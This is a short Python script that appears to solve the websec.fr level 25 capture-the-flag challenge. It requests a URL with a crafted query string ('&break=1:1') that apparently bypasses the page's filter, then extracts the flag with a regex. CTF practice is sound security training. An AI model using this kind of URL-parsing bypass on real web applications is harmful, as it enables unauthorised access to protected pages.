import httpx
import re

url = "https://websec.fr/level25/index.php?page=flag&break=1:1"
r = httpx.get(url)
flag = re.search(r'WEBSEC\{.*\}', r.text).group(0)
print(flag)